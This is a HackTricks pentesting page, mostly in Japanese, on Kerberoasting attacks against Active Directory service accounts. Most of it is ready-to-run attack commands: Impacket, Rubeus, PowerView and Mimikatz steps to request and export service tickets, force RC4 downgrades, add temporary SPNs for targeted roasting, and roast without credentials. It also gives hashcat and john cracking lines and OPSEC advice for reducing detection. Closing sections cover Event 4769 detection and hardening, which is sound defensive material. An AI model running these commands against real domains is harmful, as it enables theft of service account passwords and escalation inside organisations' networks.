# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

KerberoastingはTGSチケットの取得に焦点を当てており、特にActive Directory (AD) 上でユーザーアカウントとして動作するサービス（コンピュータアカウントは除く）に関連するチケットを対象とします。これらのチケットはユーザーパスワードから派生した鍵で暗号化されるため、オフラインで資格情報をクラックできます。ユーザーアカウントがサービスとして使われているかは、ServicePrincipalName (SPN) プロパティが空でないことで示されます。

任意の認証済みドメインユーザーがTGSチケットを要求できるため、特別な権限は不要です。

### 要点

- ユーザーアカウントとして実行されるサービス（SPNが設定されているアカウント；コンピュータアカウントは対象外）のTGSチケットを狙う。
- チケットはサービスアカウントのパスワードから派生した鍵で暗号化されており、オフラインでクラック可能。
- 昇格した権限は不要；任意の認証済みアカウントでTGSチケットを要求できる。

> [!WARNING]
> Most public tools prefer requesting RC4-HMAC (etype 23) service tickets because they’re faster to crack than AES. RC4 TGS hashes start with `$krb5tgs$23$*`, AES128 with `$krb5tgs$17$*`, and AES256 with `$krb5tgs$18$*`. However, many environments are moving to AES-only. Do not assume only RC4 is relevant.
> Also, avoid “spray-and-pray” roasting. Rubeus’ default kerberoast can query and request tickets for all SPNs and is noisy. Enumerate and target interesting principals first.

### サービスアカウントのシークレットとKerberosの暗号コスト

多くのサービスは依然として手作業で管理されるパスワードを持つユーザーアカウントで動作しています。KDCはこれらのパスワードから派生した鍵でサービスチケットを暗号化し、その暗号文を任意の認証済みプリンシパルに渡します。そのため、kerberoastingはロックアウトやDCのテレメトリ無しで無制限のオフライン推測を可能にします。暗号モードがクラックに必要なコスト（推測予算）を決定します：

| モード | 鍵導出 | 暗号タイプ | おおよその RTX 5090 スループット* | 備考 |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 を4,096回反復、ドメイン+SPNから生成されるプリンシパルごとのソルト | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | 約680万試行/s | ソルトはレインボーテーブルを阻止するが、短いパスワードの高速クラックは依然可能。 |
| RC4 + NT hash | パスワードの単一MD4（ソルトなしのNTハッシュ）；Kerberosはチケットごとに8バイトのconfounderのみを混ぜる | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** 試行/s | AESより約1000×高速；攻撃者は`msDS-SupportedEncryptionTypes`が許す場合はRC4を強制する。 |

*ベンチマークはChick3nmanによるもので、[Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/) に掲載されています。

RC4のconfounderはキーストリームをランダム化するだけで、各試行の作業量を増やすわけではありません。サービスアカウントがランダムなシークレット（gMSA/dMSA、マシンアカウント、またはvault管理の文字列）に依存していない限り、侵害の速度は純粋にGPUの処理能力次第です。AESのみのetypesを強制すれば1秒間に数十億回の試行という優位性は無効化されますが、弱い人間のパスワードは依然としてPBKDF2で破られます。

### 攻撃

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
kerberoast チェックを含む多機能ツール:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- kerberoastableなユーザーを列挙する
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- 手法 1: TGSを要求し、メモリからdumpする
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- 手法 2: 自動化ツール
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> TGS リクエストは Windows Security Event 4769 を生成します（Kerberos サービスチケットが要求されました）。

### OPSEC と AES 専用環境

- AES を持たないアカウントに対して意図的に RC4 を要求する:
- Rubeus: `/rc4opsec` は tgtdeleg を使って AES が無効なアカウントを列挙し、RC4 サービスチケットを要求します。
- Rubeus: `/tgtdeleg` と kerberoast を組み合わせると、可能な場合に RC4 リクエストも発生します。
- AES-only アカウントを黙って失敗させる代わりに Roast する:
- Rubeus: `/aes` は AES が有効なアカウントを列挙し、AES サービスチケット（etype 17/18）を要求します。
- すでに TGT（PTT または .kirbi から）を保持している場合、`/ticket:<blob|path>` と `/spn:<SPN>` または `/spns:<file>` を使って LDAP をスキップできます。
- ターゲティング、スロットリング、ノイズ低減:
- `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` および `/jitter:<1-100>` を使用します。
- `/pwdsetbefore:<MM-dd-yyyy>`（古いパスワード）で弱い可能性のあるパスワードをフィルタリングするか、`/ou:<DN>` で特権 OU を狙います。

Examples (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

アカウントを制御または変更できる場合、SPN を追加することでそれを kerberoastable にできます:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
アカウントをダウングレードしてRC4を有効にし、crackingを容易にする（対象オブジェクトの書き込み権限が必要）：
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### ユーザーへの GenericWrite/GenericAll を使った Targeted Kerberoast（一時的 SPN）

BloodHound がユーザーオブジェクトを制御していることを示している場合（例: GenericWrite/GenericAll）、そのユーザーが現在 SPN を持っていなくても、その特定のユーザーを確実に “targeted-roast” できます:

- 制御下のユーザーに一時的な SPN を追加して roastable にする。
- その SPN に対して RC4 (etype 23) で暗号化された TGS-REP を要求し、cracking を有利にする。
- `$krb5tgs$23$...` ハッシュを hashcat で crack する。
- フットプリントを減らすために SPN をクリーンアップする。

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux ワンライナー (targetedKerberoast.py が SPN の追加 -> TGS (etype 23) の要求 -> SPN の削除 を自動化します):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
hashcat autodetectを使って出力をCrackしてください（`$krb5tgs$23$`用のモード13100）：
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notes: adding/removing SPNs produces directory changes (Event ID 5136/4738 on the target user) and the TGS request generates Event ID 4769. Consider throttling and prompt cleanup.

You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (deprecated on some distros)
- `rdate -n <DC_IP>`

### Kerberoast without a domain account (AS-requested STs)

2022年9月、Charlie Clarkは、principalがpre-authenticationを要求しない場合、リクエスト本文の sname を改変した加工された KRB_AS_REQ によりサービスチケットを取得でき、実質的に TGT の代わりにサービスチケットを得ることが可能であることを示しました。これは AS-REP roasting と類似しており、有効なドメイン資格情報を必要としません。

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> 有効な資格情報がないとこの手法で LDAP を照会できないため、ユーザ一覧を提供する必要があります。

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
関連

If you are targeting AS-REP roastable users, see also:

{{#ref}}
asreproast.md
{{#endref}}

### 検出

Kerberoasting はステルス的になることがあります。DCs からの Event ID 4769 を検索し、ノイズを減らすためにフィルタを適用してください:

- サービス名 `krbtgt` と末尾が `$` のサービス名（コンピュータアカウント）を除外する。
- コンピュータアカウントからのリクエスト (`*$$@*`) を除外する。
- 成功したリクエストのみ（Failure Code `0x0`）。
- 暗号化タイプを追跡: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`)。`0x17` のみでアラートしないでください。

Example PowerShell triage:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
追加のアイデア:

- ホスト/ユーザーごとに通常のSPN利用をベースライン化し、単一のプリンシパルからの多数の異なるSPN要求の急増をアラートする。
- AESで強化されたドメインでの異常なRC4使用をフラグする。

### 緩和 / ハードニング

- サービスには gMSA/dMSA または machine accounts を使用する。管理されたアカウントは120文字以上のランダムなパスワードを持ち、自動でローテーションするため、オフラインでのクラックが実用的でない。
- サービスアカウント上でAESを強制するには、`msDS-SupportedEncryptionTypes` を AES-only (decimal 24 / hex 0x18) に設定し、パスワードをローテーションしてAESキーが導出されるようにする。
- 可能な限り環境でRC4を無効にし、RC4使用の試行を監視する。DCs上では、`msDS-SupportedEncryptionTypes` が設定されていないアカウントのデフォルトを制御するために `DefaultDomainSupportedEncTypes` レジストリ値を使用できる。十分にテストすること。
- ユーザーアカウントから不要なSPNを削除する。
- 管理されたアカウントが利用できない場合は、長くランダムなサービスアカウントのパスワード（25文字以上）を使用する。一般的なパスワードを禁止し、定期的に監査する。

## References

- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: レガシーKerberos暗号による低技術コストで高インパクトの攻撃 (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Kerberoasting 緩和のための Microsoft のガイダンス](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting ドキュメント](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
